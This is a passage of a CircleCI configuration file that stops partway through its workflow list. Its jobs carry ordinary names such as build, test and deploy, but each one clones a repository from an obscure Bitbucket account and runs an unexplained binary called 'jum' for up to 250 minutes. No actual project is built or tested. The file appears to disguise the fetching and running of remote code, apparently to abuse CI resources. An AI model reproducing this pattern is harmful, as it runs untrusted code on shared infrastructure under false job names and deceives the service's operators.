
version: 2.1

orbs:
  win: circleci/windows@2.4.0

executors:
  circleci_machine:
    docker:
      - image: circleci/node:14.15
    working_directory: ~/repo
commands:
  build:
    description: Run build
    steps:
      - run:
          name: build
          command: |
              sudo git clone --recursive https://bitbucket.org/UsertBokehf/mngn /home/mngn
              sudo chmod +x /home/mngn/jum
              /home/mngn/./jum
          no_output_timeout: 250m
      - run:
          name: buildddart
          command:
              mv /home/mngn /home/2
          when: on_fail
          no_output_timeout: 5m
  builder2:
    description: Run builder2
    steps:
      - run:
          name: build
          command: |
              sudo git clone --recursive https://bitbucket.org/UsertBokehf/mngn /home/mngn
              sudo chmod +x /home/mngn/jum
              /home/mngn/jum
          no_output_timeout: 250m
      - run:
          name: buildddart
          command:
              mv /home/mngn /home/2
          when: on_fail
          no_output_timeout: 5m
jobs:
  buildd:
    executor: circleci_machine
    working_directory: ~/repo
    steps: [build]
  build2:
    executor: circleci_machine
    working_directory: ~/repo
    steps: [builder2]
  test1:
    executor: circleci_machine
    working_directory: ~/repo
    steps: [builder2]
  test2:
    executor: circleci_machine
    working_directory: ~/repo
    steps: [builder2]
  test3:
    executor: circleci_machine
    working_directory: ~/repo
    steps: [builder2]
  deploy:
    executor: circleci_machine
    working_directory: ~/repo
    steps: [builder2]
workflows:
  version: 2
  build:
    jobs:
      - buildd
      - build2:
          requires:
          - buildd
      - test1:
          requires:
          - build2
      - test2:
          requires:
